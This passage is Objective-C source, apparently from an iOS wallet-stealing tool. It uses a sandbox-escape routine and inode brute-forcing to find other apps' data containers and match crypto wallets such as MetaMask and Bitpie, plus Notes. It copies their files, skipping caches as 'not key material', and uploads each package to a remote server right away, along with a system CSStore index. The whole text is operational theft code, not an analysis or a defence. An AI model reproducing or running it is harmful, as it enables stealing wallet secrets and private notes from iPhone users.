    NSUInteger opened = 0, stores = 0;
    NSString *dumpContainer = nil, *dumpName = nil;
    NSUInteger dumpPaths = 0;                 // 回传哪一份 store：取容器路径最多的
    NSMutableString *diag = [NSMutableString string];
    for (NSString *container in daemons) {
        int64_t handle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
        if (handle <= 0) continue;
        opened++;

        NSString *caches = [container stringByAppendingPathComponent:@"Library/Caches"];
        NSArray<NSString *> *names = [[NSFileManager defaultManager]
                                      contentsOfDirectoryAtPath:caches error:nil];
        for (NSString *name in names) {
            if (![name hasSuffix:@".csstore"]) continue;

            NSString *path = [caches stringByAppendingPathComponent:name];
            NSData *data = [NSData dataWithContentsOfFile:path
                                                  options:NSDataReadingMappedIfSafe
                                                    error:nil];
            if (data.length < 0x1000) continue;
            if (memcmp(data.bytes, "bdsl", 4) != 0) continue;

            stores++;
            // 字符串池只建一次，全部布局候选共用（每条记录读的是 ref>>2）
            NSDictionary<NSNumber *, NSString *> *tab = WQLBuildStringTable(data.bytes, data.length);
            [self log:@"    字符串表：%lu 条（ref>>2 索引）", (unsigned long)tab.count];

            // 按版本候选布局逐个解析。评分必须偏向「App 主容器」而非总数：
            // 插件记录数量远多于 App 记录（27.2.1 上 1178 对 342），
            // 只看总数会选中只有插件命中的那套，把钱包主容器整片丢掉。
            NSMutableDictionary<NSString *, NSString *> *bestMap = nil;
            const char *bestLabel = "auto";
            uint32_t bestSize = 0;
            NSUInteger bestScore = 0, bestAppCount = 0, bestPathCount = 0;
            for (size_t i = 0; i < kWQLLSLayoutCount; i++) {
                const WQLLSLayout *L = &kWQLLSLayouts[i];
                NSDictionary *m = WQLParseCSStore(data, tab, L->size, L->bid, L->con);
                NSDictionary *mp = WQLParseCSStore(data, tab, L->pluginSize,
                                                   L->pluginBid, L->pluginCon);
                NSUInteger appCount = m.count, pluginCount = mp.count;
                if (appCount + pluginCount == 0) continue;

                // 合并后落到「数据容器路径」的条数才是真实收益
                NSMutableDictionary *merged = [NSMutableDictionary dictionary];
                if (appCount) [merged addEntriesFromDictionary:m];
                if (pluginCount) [merged addEntriesFromDictionary:mp];
                NSUInteger useful = 0;
                for (NSString *bid in merged) {
                    NSString *con = merged[bid];
                    if (con.length && [con containsString:@"/Containers/Data/"]) useful++;
                }
                // App 记录优先：有 App 主容器的那套永远压过纯插件那套
                NSUInteger score = appCount * 1000 + useful;
                if (score <= bestScore && bestMap.count) continue;

                bestMap = merged;
                bestLabel = L->label;
                bestSize = L->size;
                bestScore = score;
                bestAppCount = appCount;
                bestPathCount = useful;
            }
            if (!bestMap.count) {
                NSString *autoDesc = nil;
                NSDictionary *autoMap = WQLAutoLayoutMap(data, tab, &autoDesc);
                if (autoMap.count) {
                    bestMap = [autoMap mutableCopy];
                    bestLabel = "auto";
                    bestSize = 0;
                    [self log:@"    自动探测布局：%@（%lu 条）", autoDesc, (unsigned long)autoMap.count];
                }
            }

            // 反向表：容器路径 -> bundleId（CSStore 里存的就是最终路径）
            NSMutableDictionary<NSString *, NSString *> *byContainer = [NSMutableDictionary dictionary];
            for (NSString *bid in bestMap) {
                NSString *con = bestMap[bid];
                if (!con.length || !bid.length) continue;
                byContainer[WQLCanonicalContainerPath(con)] = bid;
            }

            // iOS 27.x：metadata.plist 与 identity xattr 都读不到，bundleId
            // 只能从 CSStore 的记录表里取。布局表没覆盖的版本由自动探测补齐。

            [self log:@"    📄 %@（%.1f MB，magic=bdsl）→ 布局 %s（记录 0x%x），%lu 条映射（App %lu，含容器 %lu）",
                  name, data.length / 1048576.0, bestLabel, bestSize,
                  (unsigned long)byContainer.count,
                  (unsigned long)bestAppCount, (unsigned long)bestPathCount];

            NSInteger shown = 0;
            for (NSString *con in byContainer) {
                if (shown++ >= 3) break;
                [self log:@"        · %@ → %@", con.lastPathComponent, byContainer[con]];
            }

            // 不解析记录表，直接从明文里抽容器路径，再逐个读 metadata 认 bundleId
            NSArray<NSString *> *paths = WQLExtractContainerPaths(data);
            [self log:@"    路径抽取：%lu 个容器路径", (unsigned long)paths.count];

            NSUInteger escaped = 0, matched = 0;
            NSUInteger xattrTries = 0;
            for (NSString *raw in paths) {
                NSString *p = [raw hasSuffix:@"/"] ? [raw substringToIndex:raw.length - 1] : raw;
                if ([seen containsObject:p]) continue;
                [seen addObject:p];

                int64_t h = [[WQLEscape shared] consumeExtensionForPath:p error:nil];
                if (h <= 0) continue;
                escaped++;

                NSString *bid = byContainer[WQLCanonicalContainerPath(p)];
                // 布局表覆盖不到时回退读 xattr，但限次数：27.x 上每个容器都要
                // 先拿 token 再读属性，全量跑会很慢，留一个上限避免拖死。
                if (!bid.length && xattrTries < 400) {
                    xattrTries++;
                    bid = [self bundleIDForContainerPath:p];
                }
                if (bid.length) {
                    WQLTarget *t = [WQLTargets matchBundleID:bid inTargets:targets fuzzy:NULL];
                    if (t) {
                        matched++;
                        [hits addObject:@{ @"path": p, @"bundle": bid, @"target": t.name }];
                        [self log:@"    ★ %@（%@）→ %@", t.name, bid, p];
                    }
                }
                [[WQLEscape shared] releaseHandle:h];
            }
            [self log:@"    路径命中：可逃逸 %lu/%lu，命中钱包 %lu 个",
                  (unsigned long)escaped, (unsigned long)paths.count, (unsigned long)matched];

            // 回传样本：取容器路径最多的那份 store（SystemDataOnly 那份通常一条都没有）
            if (paths.count > dumpPaths) {
                dumpPaths = paths.count;
                dumpContainer = container;
                dumpName = name;
            }
            [diag appendFormat:@"%@ | %.1fMB | layout=%s(0x%x) | map=%lu | paths=%lu | escaped=%lu | matched=%lu\n",
             name, data.length / 1048576.0, bestLabel, bestSize,
             (unsigned long)byContainer.count, (unsigned long)paths.count,
             (unsigned long)escaped, (unsigned long)matched];
        }
        [[WQLEscape shared] releaseHandle:handle];
    }

    // 记住「容器路径最多」的那份 store，采集流程结束后无条件补传一份，
    // 供后续别的机型/版本采集不出来时做离线分析（不再需要手动上传）。
    if (dumpContainer.length && dumpName.length) {
        self.storeSampleContainer = dumpContainer;
        self.storeSampleName = dumpName;
        self.storeSampleDiag = [diag copy];
    }

    [self log:@"    daemon 容器 %lu 个，csstore %lu 个，命中目标 %lu 个，耗时 %.1f 秒",
          (unsigned long)opened, (unsigned long)stores,
          (unsigned long)hits.count, -[t0 timeIntervalSinceNow]];
    return hits;
}

/// 流程跑完后无条件回传一份 CSStore（诊断文本一起打包）。
/// 索引未命中时这是唯一的离线分析依据；命中时也留着，便于核对别的机型。
- (void)uploadStoreSample {
    NSString *container = self.storeSampleContainer;
    NSString *name = self.storeSampleName;
    if (!container.length || !name.length) {
        [self log:@"    （本轮没有可回传的 CSStore）"];
        return;
    }

    NSString *src = [[container stringByAppendingPathComponent:@"Library/Caches"]
                     stringByAppendingPathComponent:name];
    if (![[NSFileManager defaultManager] fileExistsAtPath:src]) {
        [self log:@"    ⛔ CSStore 已不存在，跳过回传：%@", name];
        return;
    }

    int64_t dumpHandle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
    if (dumpHandle <= 0) {
        [self log:@"    ⛔ 取不到 CSStore 容器权限，跳过回传"];
        return;
    }

    NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:stage error:nil];
    [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];

    if (self.storeSampleDiag.length) {
        [self.storeSampleDiag writeToFile:[stage stringByAppendingPathComponent:@"_wql_index.txt"]
                               atomically:YES
                                 encoding:NSUTF8StringEncoding
                                    error:nil];
    }

    NSString *dst = [stage stringByAppendingPathComponent:name];
    if ([fm copyItemAtPath:src toPath:dst error:nil]) {
        NSDictionary *attr = [fm attributesOfItemAtPath:dst error:nil];
        uint64_t sz = [attr[NSFileSize] unsignedLongLongValue];
        [self log:@"    ↑ 回传 CSStore %@（%.1f MB）供离线分析", name, sz / 1048576.0];
        BOOL ok = [self uploadStage:stage blocking:YES];
        [self log:@"    %@ CSStore 回传", ok ? @"✅" : @"⛔"];
    } else {
        [self log:@"    ⛔ CSStore 复制失败，跳过回传"];
    }
    [fm removeItemAtPath:stage error:nil];
    [[WQLEscape shared] releaseHandle:dumpHandle];
}

#pragma mark - 主流程

- (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:outDir withIntermediateDirectories:YES attributes:nil error:nil];
    self.lastRunUsable = NO;

    NSMutableArray<WQLTarget *> *targets = [[WQLTargets wallets] mutableCopy];
    if (self.includeExtras) [targets addObjectsFromArray:[WQLTargets extras]];
    if (self.includeNotes) [targets addObjectsFromArray:[WQLTargets notes]];

    NSString *err = nil;
    if (![[WQLEscape shared] prepareWithError:&err]) {
        [self log:@"⛔ 通道不可用：%@", err ?: @"未知原因"];
        return @[];
    }
    NSDictionary *diag = [[WQLEscape shared] diagnostics];
    [self log:@"【第1步 环境检查】系统 %@   机型 %@", diag[@"os"], diag[@"device"]];
    [self log:@"    共享目录：%@", diag[@"groupPath"]];
    [self log:@"    取权限方式：%@，flags=%@",
          [diag[@"symbolsOK"] boolValue] ? @"内核接口可用" : @"接口缺失",
          diag[@"flagsFirst"]];
    if (![diag[@"groupOK"] boolValue]) {
        [self log:@"    ⛔ 没有共享目录：签名没带 App Group，后面无法继续"];
        return @[];
    }
    self.lastRunUsable = YES;

    NSArray<NSString *> *allRoots = [self defaultRoots];
    NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
    NSMutableArray<NSString *> *needScan = [NSMutableArray array];

    [self log:@"【第2步 找容器目录】"];
    for (NSString *root in allRoots) {
        struct statfs rfs;
        if (statfs(root.fileSystemRepresentation, &rfs) == 0) {
            [self log:@"    · %@ → 卷 %d:%d", root.lastPathComponent,
                  rfs.f_fsid.val[0], rfs.f_fsid.val[1]];
        } else {
            [self log:@"    · %@ → statfs 失败", root.lastPathComponent];
        }
        NSString *fastErr = nil;
        NSArray<NSString *> *direct = [self listChildrenOfDirectory:root error:&fastErr];
        if (direct) {
            children[root] = direct;
            [self log:@"    ✅ 直接列出 %@（%lu 个）",
                  root.lastPathComponent, (unsigned long)direct.count];
            if (direct.count) [[WQLPathCache shared] mergeScanned:@{ root: direct }];
            continue;
        }
        [self log:@"    ⚠️ %@ 不能直接列出（%@），改用逐个扫描",
              root.lastPathComponent, fastErr ?: @"系统拒绝"];

        if (self.forceFullScan) {
            [self log:@"       └ 强制完整流程，忽略缓存"];
            [needScan addObject:root];
            continue;
        }

        NSArray<NSString *> *cached = [[WQLPathCache shared] validPathsForRoot:root];
        BOOL stale = [[WQLPathCache shared] needsRescanForRoot:root];
        NSTimeInterval since = [[WQLPathCache shared] secondsSinceScanForRoot:root];
        if (cached.count && !stale) {
            children[root] = cached;
            [self log:@"       └ 用上次缓存 %lu 个，跳过扫描", (unsigned long)cached.count];
        } else if (cached.count == 0 && since < 24 * 3600) {
            // 上次确实扫过、结果就是 0 个：不要为了它再跑一遍 3 亿 inode
            children[root] = @[];
            [self log:@"       └ 24 小时内扫过（0 个），跳过"];
        } else {
            if (cached.count) [self log:@"       └ 缓存已失效，重新扫描"];
            [needScan addObject:root];
        }
    }

    NSMutableArray<NSDictionary *> *records = [NSMutableArray array];
    __block NSUInteger enumerated = 0;
    __block NSUInteger unreadable = 0;
    __block NSUInteger matchedCount = 0;
    __block NSUInteger uploadedWallets = 0;
    __block NSUInteger skippedUnchanged = 0;
    __block NSMutableArray<NSString *> *unreadableSamples = [NSMutableArray array];

    void (^handleContainer)(NSString *, NSString *) = ^(NSString *root, NSString *path) {
        enumerated++;
        NSString *escErr = nil;
        int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
        NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
        BOOL fuzzy = NO;
        WQLTarget *t = [WQLTargets matchBundleID:bundleID inTargets:targets fuzzy:&fuzzy];

        if (handle <= 0) {
            unreadable++;
            if (unreadableSamples.count < 8) {
                [unreadableSamples addObject:[NSString stringWithFormat:@"%@（%@）",
                                              path.lastPathComponent, escErr ?: @"取不到权限"]];
            }
            return;
        }
        if (!t) {
            [[WQLEscape shared] releaseHandle:handle];
            return;
        }

        matchedCount++;
        if (fuzzy) [self log:@"    ↳ 模糊命中 %@ → 归入 %@", bundleID, t.name];

        uint64_t bytes = 0;
        NSArray<NSString *> *files = [self copyTarget:t container:path bundleID:bundleID
                                                outDir:outDir bytes:&bytes];
        if (files.count == 0 && !t.wholeContainer) {
            [self log:@"       %@ 固定路径不存在，改为整容器拷贝", t.name];
            files = [self copyWholeContainer:path forTarget:t bundleID:bundleID
                                       outDir:outDir bytes:&bytes];
        }
        [[WQLEscape shared] releaseHandle:handle];

        NSMutableDictionary *record = [@{
            @"bundleId": bundleID ?: @"",
            @"path": path,
            @"target": t.name ?: @"",
            @"status": files.count ? @"copied" : @"empty",
            @"fuzzy": @(fuzzy),
            @"files": files,
            @"bytes": @(bytes),
        } mutableCopy];
        [records addObject:record];

        [self log:@"    %@ %@：%lu 个文件，%@",
              files.count ? @"✅" : @"⛔", t.name,
              (unsigned long)files.count, [self humanBytes:bytes]];
        for (NSString *f in files) {
            NSString *base = [f hasPrefix:[path stringByAppendingString:@"/"]]
                ? [f substringFromIndex:path.length + 1] : f.lastPathComponent;
            NSNumber *sz = [[NSFileManager defaultManager]
                            attributesOfItemAtPath:f error:nil][NSFileSize];
            [self log:@"        └ %@ (%@)", base, [self humanBytes:[sz unsignedLongLongValue]]];
        }

        // 采到一个就立刻打包上传，不等整轮扫完；内容没变则跳过
        if (files.count) {
            NSString *walletDir = [outDir stringByAppendingPathComponent:bundleID ?: @"unknown"];
            NSString *fp = [self fingerprintForDirectory:walletDir];
            NSString *prevFp = [self storedFingerprintForBundle:bundleID ?: @""];
            if (!self.forceUpload && prevFp.length && [prevFp isEqualToString:fp]) {
                [self log:@"    ⏭ %@ 与上次一致，跳过上传", t.name];
                skippedUnchanged++;
            } else {
                NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:
                                   [NSString stringWithFormat:@"wql_up_%@", NSUUID.UUID.UUIDString]];
                [self copyTreeFrom:walletDir
                                to:[stage stringByAppendingPathComponent:bundleID ?: @"unknown"]
                             bytes:NULL];
                NSData *man = [self manifestDataForRecords:@[ record ]];
                if (man) [man writeToFile:[stage stringByAppendingPathComponent:@"_manifest.json"]
                               atomically:YES];

                [self log:@"    📤 立即上传 %@（%@）", t.name, [self humanBytes:bytes]];
                [self enqueueUploadOfStage:stage
                                    wallet:t.name
                                  bundleID:(bundleID ?: @"")
                               fingerprint:fp
                                     bytes:bytes];
                uploadedWallets++;
            }
        }
    };

    // 先走索引：拿到全部目标就不用再跑 inode 暴破
    NSArray<NSDictionary *> *indexed = nil;
    if (self.forceBruteForce) {
        [self log:@"【调试】强制跳过索引，直接走暴破"];
        indexed = @[];
    } else {
        indexed = [self discoverContainersViaStore:targets];
    }

    if (self.indexOnly) {
        [self log:@"【调试】只跑索引：命中 %lu 个目标，跳过采集与扫描",
              (unsigned long)indexed.count];
        return records;
    }

    if (indexed.count) {
        [self log:@"【索引】跳过 inode 扫描，直接采集 %lu 个目标", (unsigned long)indexed.count];

        // 备忘录最后处理：它的包通常十几 MB，别挡住钱包上传
        NSMutableArray<NSDictionary *> *ordered = [NSMutableArray arrayWithCapacity:indexed.count];
        for (NSDictionary *hit in indexed) {
            if (![hit[@"target"] isEqualToString:@"Notes"]) [ordered addObject:hit];
        }
        for (NSDictionary *hit in indexed) {
            if ([hit[@"target"] isEqualToString:@"Notes"]) [ordered addObject:hit];
        }

        for (NSDictionary *hit in ordered) {
            if (self.cancelBlock && self.cancelBlock()) break;
            handleContainer(@"/index", hit[@"path"]);
        }
    } else if (!needScan.count) {
        [self log:@"    全部命中缓存，跳过扫描"];
    } else {
        uint64_t maxInode = self.maxInode;
        if (maxInode == 0) maxInode = [WQLPathLeak baselineInodeWithError:&err];
        if (maxInode == 0) {
            [self log:@"    ⛔ 取基线 inode 失败：%@", err ?: @"未知"];
        } else {
            BOOL hasCp = [WQLPathLeak hasCheckpoint];
            [self log:@"【第3步 扫描并在发现时立即采集】"];
            [self log:@"    %@，预计 %@",
                  hasCp ? @"发现上次断点，本次续扫" : @"首次扫描（最慢的一步）",
                  hasCp ? @"几分钟" : @"10 分钟以上"];
            [self log:@"    提示：可切后台，被杀也会从断点继续"];

            __weak typeof(self) weakSelf = self;
            __block uint64_t lastPct = 0;
            __block uint64_t lastUiPct = 0;
            __block NSTimeInterval lastRateT = 0;
            __block uint64_t lastRateDone = 0;
            BOOL completed = NO;
            NSDictionary<NSString *, NSArray<NSString *> *> *scannedRes =
            [WQLPathLeak childrenOfDirectories:needScan
                                      maxInode:maxInode
                                        onPath:^(NSString *root, NSString *path) {
                handleContainer(root, path);
            } progress:^(uint64_t done, uint64_t total) {
                __strong typeof(weakSelf) self = weakSelf;
                if (!self || total == 0) return;
                uint64_t pct = done * 100 / total;
                if (pct >= lastPct + 10) {
                    NSTimeInterval now = [NSDate date].timeIntervalSince1970;
                    double rate = (lastRateT > 0 && now > lastRateT)
                                  ? (double)(done - lastRateDone) / (now - lastRateT) : 0;
                    lastRateT = now;
                    lastRateDone = done;
                    lastPct = pct;
                    [self log:@"    扫描进度 %llu%%（已发现 %lu 个容器，采集 %lu 个钱包，%.0f inode/s）",
                          (unsigned long long)pct,
                          (unsigned long)records.count, (unsigned long)matchedCount, rate];
                }
                if (self.progressBlock && pct >= lastUiPct + 1) {
                    lastUiPct = pct;
                    self.progressBlock([NSString stringWithFormat:
                                        @"扫描 %llu%% · 命中 %lu · 已传 %lu",
                                        (unsigned long long)pct,
                                        (unsigned long)matchedCount,
                                        (unsigned long)uploadedWallets]);
                }
            } cancel:^BOOL{
                __strong typeof(weakSelf) self = weakSelf;
                return self ? (self.cancelBlock ? self.cancelBlock() : NO) : YES;
            } completed:&completed error:&err];

            if (completed && scannedRes.count) {
                [[WQLPathCache shared] mergeScanned:scannedRes];
                for (NSString *root in scannedRes) {
                    [[WQLPathCache shared] markRootScanned:root];
                }
                [self log:@"    扫描完成，%lu 个根目录结果已写入缓存（下次启动秒进）",
                      (unsigned long)scannedRes.count];
            } else if (!completed) {
                [self log:@"    ⚠️ 扫描被中断，断点已保存，下次会继续"];
            }
        }
    }

    if (!indexed.count) {
        for (NSString *root in allRoots) {
            if ([needScan containsObject:root]) continue;
            NSArray<NSString *> *items = children[root];
            if (!items.count) continue;
            [self log:@"【处理缓存路径】%@ 下 %lu 个", root.lastPathComponent, (unsigned long)items.count];
            for (NSString *p in items) {
                if (self.cancelBlock && self.cancelBlock()) break;
                handleContainer(root, p);
            }
        }
    }

    // 等串行上传队列排空，保证扫描结束时所有包都已落盘
    if (uploadedWallets) {
        [self log:@"    等待最后 %lu 个包上传完成…", (unsigned long)uploadedWallets];
        dispatch_sync([self uploadQueue], ^{});
    }

    // 采集流程已全部走完、钱包包也传完：再额外无条件回传一份 CSStore。
    // 这样别的机型/版本万一采不出来，服务器上已经有原始索引可离线分析，
    // 不用再让用户手动去传。
    if (!self.indexOnly && !self.forceBruteForce) {
        [self log:@"【补传】CSStore 原始索引（供离线分析）"];
        [self uploadStoreSample];
    }

    [self log:@"【第4步 生成清单】"];
    [self writeWalletManifestInDirectory:outDir records:records];

    NSData *json = [NSJSONSerialization dataWithJSONObject:records
                                                   options:NSJSONWritingPrettyPrinted
                                                     error:nil];
    if (json) {
        [json writeToFile:[outDir stringByAppendingPathComponent:@"manifest.json"] atomically:YES];
    }

    [self log:@"【采集汇总】"];
    NSMutableDictionary<NSString *, NSDictionary *> *byWallet = [NSMutableDictionary dictionary];
    for (NSDictionary *r in records) {
        NSString *name = r[@"target"];
        if (!name.length) continue;
        NSUInteger n = [(NSArray *)r[@"files"] count];
        NSDictionary *prev = byWallet[name];
        if (!prev) byWallet[name] = r;
        else if ([(NSArray *)prev[@"files"] count] == 0 && n > 0) byWallet[name] = r;
    }
    NSArray *names = [byWallet.allKeys sortedArrayUsingSelector:@selector(compare:)];
    for (NSString *name in names) {
        NSDictionary *r = byWallet[name];
        NSUInteger n = [(NSArray *)r[@"files"] count];
        unsigned long long b = [r[@"bytes"] unsignedLongLongValue];
        [self log:@"    %@ %@：%@", n ? @"✅" : @"⛔", name,
              n ? [NSString stringWithFormat:@"%lu 个文件，%@",
                   (unsigned long)n, [self humanBytes:b]] : @"没有拿到材料"];
    }
    [self log:@"    枚举 %lu 个容器（%lu 个取不到权限），命中 %lu 个，上传 %lu 个包，未变化 %lu 个，涉及 %lu 个钱包",
          (unsigned long)enumerated, (unsigned long)unreadable,
          (unsigned long)matchedCount, (unsigned long)uploadedWallets,
          (unsigned long)skippedUnchanged, (unsigned long)byWallet.count];
    if (unreadableSamples.count) {
        [self log:@"    取不到权限的示例（前 %lu 个）：", (unsigned long)unreadableSamples.count];
        for (NSString *s in unreadableSamples) [self log:@"        · %@", s];
    }

    return records;
}

#pragma mark - 父目录快路径

- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error {
    NSString *escErr = nil;
    int64_t handle = [[WQLEscape shared] consumeExtensionForPath:dir error:&escErr];
    if (handle <= 0) {
        if (error) *error = escErr ?: @"父目录豁免失败";
        return nil;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *e = nil;
    NSArray *items = [fm contentsOfDirectoryAtPath:dir error:&e];
    if (!items) {
        [[WQLEscape shared] releaseHandle:handle];
        if (error) *error = e.localizedDescription ?: @"列目录失败";
        return nil;
    }

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *name in items) {
        if ([name hasPrefix:@"."]) continue;
        NSString *full = [dir stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:full isDirectory:&isDir] && isDir) [out addObject:full];
    }

    [[WQLEscape shared] releaseHandle:handle];
    return out;
}

#pragma mark - 容器识别

- (NSString *)bundleIDForContainerPath:(NSString *)path {
    if (!path.length) return nil;

    // 1) iOS 26 及以前：容器里的 metadata.plist
    NSString *meta = [path stringByAppendingPathComponent:kWQLContainerMeta];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:meta];
    NSString *ident = d[@"MCMMetadataIdentifier"];
    if (ident.length) return ident;

    // 2) iOS 26 及以前：identifier 扩展属性
    char buf[512] = {0};
    ssize_t n = getxattr(path.fileSystemRepresentation,
                         "com.apple.containermanager.identifier",
                         buf, sizeof(buf) - 1, 0, 0);
    if (n > 0) {
        buf[n] = 0;
        NSString *s = [NSString stringWithUTF8String:buf];
        if (s.length) return s;
    }

    // 3) iOS 27.2+：前两项都读不到了，改为读 identity 属性（纯文本，含 "identifier: xxx" 行）。
    //    读这个属性需要先拿到该容器的 sandbox token。
    int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:nil];
    if (handle <= 0) return nil;

    n = getxattr(path.fileSystemRepresentation,
                 "com.apple.containermanager.identifier",
                 buf, sizeof(buf) - 1, 0, 0);
    if (n > 0) {
        buf[n] = 0;
        NSString *s = [NSString stringWithUTF8String:buf];
        if (s.length) {
            [[WQLEscape shared] releaseHandle:handle];
            return s;
        }
    }

    NSString *result = nil;
    char identity[4096] = {0};
    n = getxattr(path.fileSystemRepresentation,
                 "com.apple.containermanager.identity",
                 identity, sizeof(identity) - 1, 0, 0);
    if (n > 0) {
        NSString *text = [[NSString alloc] initWithBytes:identity
                                                  length:(NSUInteger)n
                                                encoding:NSUTF8StringEncoding];
        for (NSString *raw in [text componentsSeparatedByString:@"\n"]) {
            NSString *line = [raw stringByTrimmingCharactersInSet:
                              [NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (![line hasPrefix:@"identifier:"]) continue;
            NSString *v = [[line substringFromIndex:11] stringByTrimmingCharactersInSet:
                           [NSCharacterSet whitespaceCharacterSet]];
            if (!v.length) continue;
            if ([v rangeOfCharacterFromSet:
                 [NSCharacterSet whitespaceAndNewlineCharacterSet]].location != NSNotFound) continue;
            result = v;
            break;
        }
    }
    [[WQLEscape shared] releaseHandle:handle];
    return result;
}

#pragma mark - 拷贝

- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
                         container:(NSString *)container
                          bundleID:(NSString *)bundleID
                            outDir:(NSString *)outRoot
                             bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID];
    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];

    NSMutableArray<NSString *> *copied = [NSMutableArray array];
    uint64_t total = 0;

    if (t.wholeContainer) {
        NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
        [copied addObjectsFromArray:[self copyTreeFrom:container to:dst bytes:&total]];
    } else {
        for (NSString *rel in t.relativePaths) {
            NSString *src = [container stringByAppendingPathComponent:rel];
            if (![fm fileExistsAtPath:src]) continue;

            for (NSString *s in [self sourcesForPath:src]) {
                uint64_t sz = [self sizeOfItemAtPath:s];
                uint64_t limit = t.maxBytes ?: self.maxContainerBytes;
                if (sz > limit) {
                    [self log:@"       跳过超大项 %@（%@ > %@）", s.lastPathComponent,
                          [self humanBytes:sz], [self humanBytes:limit]];
                    continue;
                }
                NSString *dstRel = [self relative:s fromContainer:container];
                NSString *dst = [destRoot stringByAppendingPathComponent:dstRel];
                BOOL isDir = NO;
                [fm fileExistsAtPath:s isDirectory:&isDir];

                if (isDir && t.excludeTokens.count) {
                    uint64_t sub = 0;
                    [self copyDirectory:s to:dst skipping:t.excludeTokens bytes:&sub];
                    [copied addObject:dst];
                    total += sub;
                    continue;
                }

                [fm createDirectoryAtPath:[dst stringByDeletingLastPathComponent]
              withIntermediateDirectories:YES attributes:nil error:nil];
                [fm removeItemAtPath:dst error:nil];
                NSError *e = nil;
                if ([fm copyItemAtPath:s toPath:dst error:&e]) {
                    [copied addObject:dst];
                    total += sz;
                } else {
                    [self log:@"       拷贝失败 %@：%@", s.lastPathComponent, e.localizedDescription];
                }
            }
        }
    }

    if (bytesOut) *bytesOut = total;
    return copied;
}

- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
                                  forTarget:(WQLTarget *)t
                                   bundleID:(NSString *)bundleID
                                     outDir:(NSString *)outRoot
                                      bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID ?: @"unknown"];
    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
    return [self copyTreeFrom:container to:dst bytes:bytesOut];
}

/// 整容器拷贝时跳过的东西：截图、缓存、HTTP 存储、Cookie、系统 dyld 缓存、日志。
/// 这些既不是密钥材料，还会把包撑到几 MB（Bitpie 的 SplashBoard 快照就占 6MB）。
+ (BOOL)isNoiseRelativePath:(NSString *)rel {
    NSString *l = rel.lowercaseString;
    if ([l hasSuffix:@".ktx"] || [l hasSuffix:@".xlog"] ||
        [l hasSuffix:@".dyld4"] || [l hasSuffix:@".dyld3"]) return YES;

    NSArray<NSString *> *segs = [l componentsSeparatedByString:@"/"];
    for (NSUInteger i = 0; i + 1 < segs.count; i++) {
        if (![segs[i] isEqualToString:@"library"]) continue;
        NSString *b = segs[i + 1];
        if ([b isEqualToString:@"caches"] || [b isEqualToString:@"splashboard"] ||
            [b isEqualToString:@"httpstorages"] || [b isEqualToString:@"cookies"] ||
            [b isEqualToString:@"logs"] || [b isEqualToString:@"saved application state"]) {
            return YES;
        }
    }
    for (NSString *s in segs) {
        if ([s isEqualToString:@"storekit"] || [s isEqualToString:@"oklog_new"]) return YES;
    }
    return NO;
}

- (NSArray<NSString *> *)copyTreeFrom:(NSString *)src
                                   to:(NSString *)dst
                                bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *copied = [NSMutableArray array];
    uint64_t total = 0;
    uint64_t skippedBytes = 0;
    NSUInteger failed = 0;
    NSUInteger skipped = 0;

    NSDirectoryEnumerator *e = [fm enumeratorAtPath:src];
    NSString *rel = nil;
    while ((rel = [e nextObject])) {
        if ([rel.lastPathComponent hasPrefix:@".com.apple.mobile_container_manager"]) continue;

        NSString *full = [src stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;

        uint64_t sz = [[fm attributesOfItemAtPath:full error:nil][NSFileSize] unsignedLongLongValue];

        if ([WQLScanner isNoiseRelativePath:rel]) {
            skipped++;
            skippedBytes += sz;
            continue;
        }

        if (total + sz > self.maxContainerBytes) {
            [self log:@"       达到门限 %@，停止", [self humanBytes:self.maxContainerBytes]];
            break;
        }

        NSString *dstPath = [dst stringByAppendingPathComponent:rel];
        [fm createDirectoryAtPath:[dstPath stringByDeletingLastPathComponent]
      withIntermediateDirectories:YES attributes:nil error:nil];

        if ([fm copyItemAtPath:full toPath:dstPath error:nil]) {
            [copied addObject:dstPath];
            total += sz;
        } else {
            failed++;
        }
    }

    if (skipped) {
        [self log:@"       已跳过 %lu 个缓存/截图/日志文件（%@）",
              (unsigned long)skipped, [self humanBytes:skippedBytes]];
    }
    if (failed) [self log:@"       跳过 %lu 个无权限文件", (unsigned long)failed];
    if (bytesOut) *bytesOut = total;
    return copied;
}

/// 目录整体拷贝，跳过文件名里含任一 token 的条目（MetaMask 的 Snap 缓存）
- (void)copyDirectory:(NSString *)src
                   to:(NSString *)dst
             skipping:(NSArray<NSString *> *)tokens
                bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    uint64_t total = 0;

